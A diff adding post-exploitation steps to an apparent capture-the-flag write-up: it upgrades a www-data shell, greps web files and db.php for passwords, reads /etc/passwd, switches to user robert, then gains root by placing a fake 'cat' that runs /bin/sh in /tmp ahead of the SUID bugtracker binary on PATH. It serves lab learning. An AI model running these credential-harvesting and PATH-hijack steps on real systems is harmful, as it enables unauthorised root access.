@@ -59,6 +59,86 @@ Caught shell as www-data
 
 ### Post Exploitation
 
+**Lateral Movement**
+
+Upgradede shell:
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Navigated to web server php files and searched for credentials 
+```bash 
+cd /var/www/html/cdn/cgi/login
+cat * | grep -i passw*
+```
+Found the harcoded password MEGACORP_4dm1n!
+
+Checked available users on system 
+```bash
+cat /etc/passwd
+```
+
+Found user Robert. Hardcoded password failed.
+
+Manually read db.php from web directory files 
+```bash 
+cat db.php
+```
+Found database credential record for robert. 
+```bash
+su robert
+```
+Successfuly Logged in. 
+
+Found and Read user flag:
+```bash 
+ls /home/robert
+cat /home/robert/user.txt
+```
+![User flag](userflag.png)
+
+
+**Privilege Escalation**
+
+Checked Robert's groups using id -- member of bugtracker 
+
+Found SUID binary owned by the bugtracker group 
+```bash
+find / -group bugtracker 2>/dev/null
+```
+
+Ran bugtracker application to observe it's behavior. Tool outputs file content using path. Error messages shows cat is referenced without a full path -- revealing that bugtracker relies on directory search in $PATH
+
+Created fake cat in /tmp with execute privileges
+```bash
+cd /tmp
+echo "/bin/sh" > cat
+chmod +x cat
+```
+
+ Prepended /tmp to Path so the fake cat gets found first
+```bash
+export PATH=/tmp: $PATH
+```
+Ran bugtracker from /tmp. Path called fake cat and spawned a shell as root
+
+```bash
+/usr/bin/bugtracker
+```
+
+Path was still hijacked so full path was used to read the root flag
+
+```bash 
+cd /root
+/bin/cat /root/root.txt
+```
+![Root Flag](rootflag.jpeg)
+
+
+
+
+
+
 
 ### Key Takeaway
 
